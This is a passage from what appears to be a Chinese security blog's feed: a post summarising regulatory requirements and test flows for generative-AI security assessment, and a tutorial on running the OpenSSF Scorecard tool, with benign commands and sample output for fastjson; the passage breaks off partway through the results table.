title="参考"></a>参考</h1><ul><li>SCACustRulesGuide23.2.0.pdf</li><li>SCA_Cust_Rules_Guide_23.2.0.zip</li><li>2024.2.1.0003-zh_CN.zip</li></ul><p>参考文件，已托管到知识星球，自取。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CodeAudit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AIGC安全评估</title>
    <link href="/2024/10/31/2024-10-31-aigc-security-check/"/>
    <url>/2024/10/31/2024-10-31-aigc-security-check/</url>
    
    <content type="html"><![CDATA[<h1 id="AIGC安全评估"><a href="#AIGC安全评估" class="headerlink" title="AIGC安全评估"></a>AIGC安全评估</h1><hr><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近有朋友问到AIGC安全评估的一些问题，最近做了一些调研，因为博主视野有限，文章不足之处请谅解。根据国家网信办、国家发展改革委、教育部、科技部、工业和信息化部、公安部、广电总局七部门的要求，提供具有舆论属性或者社会动员能力的生成式人工智能服务的，应当按照国家有关规定开展安全评估。</p><h2 id="评估政策依据"><a href="#评估政策依据" class="headerlink" title="评估政策依据"></a>评估政策依据</h2><h3 id="基本法规"><a href="#基本法规" class="headerlink" title="基本法规"></a>基本法规</h3><ol><li>《中华人民共和国网络安全法》</li><li>《中华人民共和国科学技术进步法》</li><li>《中华人民共和国数据安全法》</li><li>《中华人民共和国个人信息保护法》</li></ol><h3 id="AIGC相关法规"><a href="#AIGC相关法规" class="headerlink" title="AIGC相关法规"></a>AIGC相关法规</h3><ol><li>《互联网信息服务算法推荐管理规定》</li><li>《互联网信息服务深度合成管理规定》</li><li>《具有舆论属性或社会动员能力的互联网信息服务安全评估规定》</li><li>《生成式人工智能服务安全基本要求》</li><li>《信息安全技术 生成式人工智能人工标注安全规范》</li><li>《信息安全技术 生成式人工智能预训练和优化训练数据安全规范》</li><li>《生成式人工智能（大语言模型）上线备案表》</li><li>《生成式人工智能服务管理暂行办法》</li></ol><h2 id="评估内容"><a href="#评估内容" class="headerlink" title="评估内容"></a>评估内容</h2><h3 id="语料安全"><a href="#语料安全" class="headerlink" title="语料安全"></a>语料安全</h3><h4 id="语料来源管理"><a href="#语料来源管理" class="headerlink" title="语料来源管理"></a>语料来源管理</h4><ul><li>建立完整的语料获取审核机制</li><li>确保语料来源合法合规</li><li>实施多源语料协同管理</li><li>建立语料溯源机制</li></ul><h4 id="语料安全-1"><a href="#语料安全-1" class="headerlink" title="语料安全"></a>语料安全</h4><ul><li><p><strong>内容过滤机制</strong></p><ul><li>建立多层次过滤体系</li><li>实时监控和更新过滤规则</li><li>保留过滤记录</li></ul></li><li><p><strong>知识产权保护</strong></p><ul><li>建立版权检测机制</li><li>实施著作权审核</li><li>建立授权使用追踪系统</li></ul></li><li><p><strong>个人信息保护</strong></p><ul><li>实施个人信息脱敏</li><li>建立隐私保护机制</li><li>确保数据使用合规</li></ul></li></ul><h4 id="语料标注"><a href="#语料标注" class="headerlink" title="语料标注"></a>语料标注</h4><ul><li><p><strong>标注人员要求</strong></p><ul><li>专业资质认证</li><li>保密协议签署</li><li>定期培训考核</li></ul></li><li><p><strong>标注规则制定</strong></p><ul><li>建立统一标准</li><li>实施质量控制</li><li>定期更新优化</li></ul></li><li><p><strong>标注准确性保障</strong></p><ul><li>多重交叉验证</li><li>定期抽检复核</li><li>建立纠错机制</li></ul></li></ul><h3 id="模型安全"><a href="#模型安全" class="headerlink" title="模型安全"></a>模型安全</h3><h4 id="模型生成内容安全"><a href="#模型生成内容安全" class="headerlink" title="模型生成内容安全"></a>模型生成内容安全</h4><p>在训练过程中，应将生成内容安全性作为评价生成结果优劣的主要考虑指标之一；</p><ul><li>在每次对话中，应对使用者输入信息进行安全性检测，引导模型生成积极正向内容；</li><li>对提供服务过程中以及定期检测时发现的安全问题，应通过针对性的指令微调、强化学习等方式优化模<br>型。</li></ul><h4 id="服务透明度"><a href="#服务透明度" class="headerlink" title="服务透明度"></a>服务透明度</h4><p>以交互界面提供服务的，应在网站首页等显著位置向社会公开以下信息：服务适用的人群、场合、用途、服务的局限性等信息。</p><h4 id="生成内容准确性"><a href="#生成内容准确性" class="headerlink" title="生成内容准确性"></a>生成内容准确性</h4><ul><li>生成内容应准确响应使用者输入意图，所包含的数据及表述应符合科学常识或主流认知、不含错误内容。</li></ul><h4 id="生成内容可靠性"><a href="#生成内容可靠性" class="headerlink" title="生成内容可靠性"></a>生成内容可靠性</h4><ul><li>服务按照使用者指令给出的回复，应格式框架合理、有效内容含量高，应能够有效帮助使用者解答问题。</li></ul><h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ul><li>明确适用范围限制,模型适用人群、场合、用途</li><li>建立个人信息保护机制，完善个人信息处理</li><li>实施数据使用管理，合法合规收集使用者输入信息用于训练</li><li>建立内容标识系统，对图片、视频等内容标识</li><li>接受公众或使用者投诉举报</li><li>向使用者提供生成内容</li><li>建立升级维护体系，方便模型更新、升级</li></ul><h3 id="安全评估"><a href="#安全评估" class="headerlink" title="安全评估"></a>安全评估</h3><h4 id="训练语料"><a href="#训练语料" class="headerlink" title="训练语料"></a>训练语料</h4><p><img src="/img/20241031-02.png" alt="训练语料"></p><p>首先，训练语料通过四个主要的关键词库进行筛选，这些关键词库分别涵盖了意识形态和国家主权、个人隐私及名誉权、知识产权和商业秘密、以及民族、信仰和性别等方面的关键概念。通过关键词匹配，识别出包含敏感信息的文本片段，然后对这些片段进行进一步评估，计算其符合安全标准的合格率，以此确保训练数据的安全性和合规性。</p><h4 id="生成内容"><a href="#生成内容" class="headerlink" title="生成内容"></a>生成内容</h4><p><img src="/img/20241031-01.png" alt="生成内容评估"></p><p>首先，通过单一问题、诱导问题和伪装问题等方法生成内容，并通过AIGC API接口提交给系统。接着，系统会根据意识形态、国家主权、个人隐私、肖像权、名誉权、知识产权、商业秘密、民族、信仰、性别等相关关键词库进行内容审查。最后，系统将生成的内容与关键词进行比对，得出涉及关键词的生成内容，并计算合格率。这一流程旨在确保AIGC生成的内容符合安全标准，避免敏感信息的泄露和不当言论的传播。</p><h4 id="问题拒答"><a href="#问题拒答" class="headerlink" title="问题拒答"></a>问题拒答</h4><p><img src="/img/20241031-03.png" alt="问题拒答"></p><p>应拒答测试题和非拒答测试题被输入到AIGC的API接口中。经过处理后，输出结果会被用来计算模型的拒答率。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.lexology.com/library/detail.aspx?g=a54d9239-1c18-4416-a0be-fc0b77fd20e4">https://www.lexology.com/library/detail.aspx?g=a54d9239-1c18-4416-a0be-fc0b77fd20e4</a></li><li><a href="https://www.aliyun.com/activity/security/secAIGC">https://www.aliyun.com/activity/security/secAIGC</a></li><li><a href="https://www.aigclab.cn/algorithmEvaluation">https://www.aigclab.cn/algorithmEvaluation</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件供应链健康度评估之scorecard</title>
    <link href="/2024/08/06/2024-08-06-openssf-scorecard/"/>
    <url>/2024/08/06/2024-08-06-openssf-scorecard/</url>
    
    <content type="html"><![CDATA[<h1 id="软件供应链健康度评估之scorecard"><a href="#软件供应链健康度评估之scorecard" class="headerlink" title="软件供应链健康度评估之scorecard"></a>软件供应链健康度评估之scorecard</h1><hr><h1 id="Scorecard介绍"><a href="#Scorecard介绍" class="headerlink" title="Scorecard介绍"></a>Scorecard介绍</h1><p>Scorecard是一个自动化工具，评估开源项目的健康度。Scorecard通过评估与开源项目安全性相关的一系列指标项，每项10分。可以使用这些评分来了解需要改进的具体领域，以增强项目的安全性。同时，还可以评估依赖项带来的安全风险，如接受这些风险、评估替代方案或与维护者合作进行改进。</p><p>注意：由于scorecard项目不断迭代更新，检测规则也在变化，本文有效时间为：2024年08月06日前后</p><h2 id="支持Scorecard项目"><a href="#支持Scorecard项目" class="headerlink" title="支持Scorecard项目"></a>支持Scorecard项目</h2><p>Scorecard已在数千个项目上运行，以监控和跟踪安全指标。主要使用Scorecard的项目包括：</p><ul><li>Tensorflow</li><li>Angular</li><li>Flutter</li><li>sos.dev</li><li>deps.dev</li></ul><p><img src="/img/20240806-01.png" alt="deps fastjson results "></p><h2 id="查看项目的评分"><a href="#查看项目的评分" class="headerlink" title="查看项目的评分"></a>查看项目的评分</h2><p>要查看Scorecard定期扫描的项目评分，请访问webviewer，并替换占位符文本为平台、用户&#x2F;组织和存储库名称：<br><code>https://scorecard.dev/viewer/?uri=&lt;github_or_gitlab&gt;.com/&lt;user_name_or_org&gt;/&lt;repository_name&gt;</code></p><p>例如：</p><p><a href="https://scorecard.dev/viewer/?uri=github.com/alibaba/fastjson">https://scorecard.dev/viewer/?uri=github.com/alibaba/fastjson</a></p><p><img src="/img/20240806-02.png" alt="fastjson score "></p><h2 id="公开数据"><a href="#公开数据" class="headerlink" title="公开数据"></a>公开数据</h2><p>每周对被认为是最关键的100万个开源项目进行Scorecard扫描，并将结果发布在BigQuery公开数据集中。最新的结果可在BigQuery视图openssf:scorecardcron.scorecard-v2_latest中查看。</p><p>可以使用BigQuery Explorer查询数据，导航至Add Data &gt; Star a project by name &gt; ‘openssf’。例如，可能会对项目评分随时间的变化感兴趣：</p><p><img src="/img/20240806-03.png" alt="bigquery data query"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-type">date</span>, score <span class="hljs-keyword">FROM</span> `openssf.scorecardcron.scorecard-v2` <span class="hljs-keyword">WHERE</span> repo.name=&quot;github.com/alibaba/fastjson&quot; <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">date</span> <span class="hljs-keyword">ASC</span><br></code></pre></td></tr></table></figure><p><img src="/img/20240806-04.png" alt="bigquery data query demo"></p><p>还可以使用bq工具将最新结果提取到Google Cloud Storage中：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"># 获取最新的PARTITION_ID<br>bq query --nouse_legacy_sql &#x27;<span class="hljs-keyword">SELECT</span> partition_id <span class="hljs-keyword">FROM</span> openssf.scorecardcron.INFORMATION_SCHEMA.PARTITIONS <span class="hljs-keyword">WHERE</span> table_name=<span class="hljs-string">&quot;scorecard-v2&quot;</span> <span class="hljs-keyword">AND</span> partition_id!=<span class="hljs-string">&quot;__NULL__&quot;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> partition_id <span class="hljs-keyword">DESC</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 提取到GCS</span><br><span class="hljs-string">bq extract --destination_format=NEWLINE_DELIMITED_JSON &#x27;</span>openssf:scorecardcron.scorecard-v2$&lt;partition_id&gt;<span class="hljs-string">&#x27; gs://bucket-name/filename-*.json</span><br></code></pre></td></tr></table></figure><h1 id="Scorecard-使用"><a href="#Scorecard-使用" class="headerlink" title="Scorecard 使用"></a>Scorecard 使用</h1><h2 id="Scorecard-GitHub-Action"><a href="#Scorecard-GitHub-Action" class="headerlink" title="Scorecard GitHub Action"></a>Scorecard GitHub Action</h2><p>使用Scorecard GitHub Action是最简单的方法，在拥有的GitHub项目上运行Scorecard。该Action在任何存储库更改时运行，并在维护者可以在存储库的安全标签中查看警报。有关更多信息，请参阅Scorecard GitHub Action安装说明。</p><h2 id="Scorecard命令行"><a href="#Scorecard命令行" class="headerlink" title="Scorecard命令行"></a>Scorecard命令行</h2><p>要在不拥有的项目上运行Scorecard扫描，请使用命令行界面安装选项。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h4><p>scorecard可以作为Docker容器使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker pull gcr.io<span class="hljs-regexp">/openssf/</span>scorecard:stable<br></code></pre></td></tr></table></figure><p>要使用特定的scorecard版本（例如v3.2.1），请运行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull gcr.io/openssf/scorecard:v3.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h4><p>自行编译，或者直接从release下载对应的二进制文件即可</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make build</span><br></code></pre></td></tr></table></figure><p>使用包管理器</p><table><thead><tr><th>包管理器</th><th>支持的分发版</th><th>命令</th></tr></thead><tbody><tr><td>Nix</td><td>NixOS</td><td>nix-shell -p nixpkgs.scorecard</td></tr><tr><td>AUR</td><td>Arch Linux</td><td>yaourt install scorecard</td></tr><tr><td>Homebrew</td><td>macOS或Linux</td><td>brew install scorecard</td></tr></tbody></table><h3 id="获取github-授权-token"><a href="#获取github-授权-token" class="headerlink" title="获取github 授权 token"></a>获取github 授权 token</h3><p>GitHub对未经认证的请求实施api速率限制。为了避免这些限制，必须在运行Scorecard之前对的请求进行认证。有两种方法可以认证的请求：创建GitHub个人访问令牌或创建GitHub App安装。</p><p>创建经典的GitHub个人访问令牌。创建个人访问令牌时，建议选择public_repo范围。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">GITHUB_AUTH_TOKEN</span>=&lt;your access token&gt;<br></code></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>若要在特定存储库上运行scorecard：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">scorecard <span class="hljs-attribute">--repo</span>=&lt;repo_url&gt;<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">scorecard --repo=https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/alibaba/</span>fastjson<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Starting [Token-Permissions]<br>Starting [Signed-Releases]<br>Starting [Packaging]<br>Starting [Dangerous-Workflow]<br>Starting [Contributors]<br>Starting [Security-Policy]<br>Starting [CI-Tests]<br>Starting [SAST]<br>Starting [License]<br>Starting [Binary-Artifacts]<br>Starting [CII-Best-Practices]<br>Starting [Pinned-Dependencies]<br>Starting [Code-Review]<br>Starting [Fuzzing]<br>Starting [Branch-Protection]<br>Starting [Vulnerabilities]<br>Starting [Dependency-Update-Tool]<br>Starting [Maintained]<br>Finished [Binary-Artifacts]<br>Finished [CII-Best-Practices]<br>Finished [Pinned-Dependencies]<br>Finished [Vulnerabilities]<br>Finished [Dependency-Update-Tool]<br>Finished [Maintained]<br>Finished [Code-Review]<br>Finished [Fuzzing]<br>Finished [Branch-Protection]<br>Finished [Token-Permissions]<br>Finished [Signed-Releases]<br>Finished [Packaging]<br>Finished [CI-Tests]<br>Finished [SAST]<br>Finished [License]<br>Finished [Dangerous-Workflow]<br>Finished [Contributors]<br>Finished [Security-Policy]<br><br>RESULTS<br>-------<br>Aggregate score: 3.9 / 10<br><br>Check scores:<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string">  SCORE  </span>|<span class="hljs-string">          NAME          </span>|<span class="hljs-string">             REASON             </span>|<span class="hljs-string">                                               DOCUMENTATION/REMEDIATION                                               </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> Binary-Artifacts       </span>|<span class="hljs-string"> no binaries found in the repo  </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#binary-artifacts       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Branch-Protection      </span>|<span class="hljs-string"> branch protection not enabled  </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#branch-protection      </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> on development/release         </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> branches                       </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> CI-Tests               </span>|<span class="hljs-string"> 0 out of 4 merged PRs          </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#ci-tests               </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> checked by a CI test -- score  </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> normalized to 0                </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> CII-Best-Practices     </span>|<span class="hljs-string"> no effort to earn an OpenSSF   </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#cii-best-practices     </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> best practices badge detected  </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 1 / 10  </span>|<span class="hljs-string"> Code-Review            </span>|<span class="hljs-string"> Found 3/28 approved changesets </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#code-review            </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> -- score normalized to 1       </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> Contributors           </span>|<span class="hljs-string"> project has 18 contributing    </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#contributors           </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> companies or organizations     </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> Dangerous-Workflow     </span>|<span class="hljs-string"> no dangerous workflow patterns </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#dangerous-workflow     </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> detected                       </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> Dependency-Update-Tool </span>|<span class="hljs-string"> update tool detected           </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#dependency-update-tool </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Fuzzing                </span>|<span class="hljs-string"> project is not fuzzed          </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#fuzzing                </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> License                </span>|<span class="hljs-string"> license file detected          </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#license                </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Maintained             </span>|<span class="hljs-string"> 0 commit(s) and 0 issue        </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#maintained             </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> activity found in the last 90  </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> days -- score normalized to 0  </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> ?       </span>|<span class="hljs-string"> Packaging              </span>|<span class="hljs-string"> packaging workflow not         </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#packaging              </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> detected                       </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Pinned-Dependencies    </span>|<span class="hljs-string"> dependency not pinned by hash  </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#pinned-dependencies    </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> detected -- score normalized   </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> to 0                           </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> SAST                   </span>|<span class="hljs-string"> SAST tool is not run on all    </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#sast                   </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> commits -- score normalized to </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> 0                              </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 10 / 10 </span>|<span class="hljs-string"> Security-Policy        </span>|<span class="hljs-string"> security policy file detected  </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#security-policy        </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> ?       </span>|<span class="hljs-string"> Signed-Releases        </span>|<span class="hljs-string"> no releases found              </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#signed-releases        </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Token-Permissions      </span>|<span class="hljs-string"> detected GitHub workflow       </span>|<span class="hljs-string"> https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#token-permissions      </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> tokens with excessive          </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> permissions                    </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br>|<span class="hljs-string"> 0 / 10  </span>|<span class="hljs-string"> Vulnerabilities        </span>|<span class="hljs-string"> 22 existing vulnerabilities    </span>|<span class="hljs-string"> 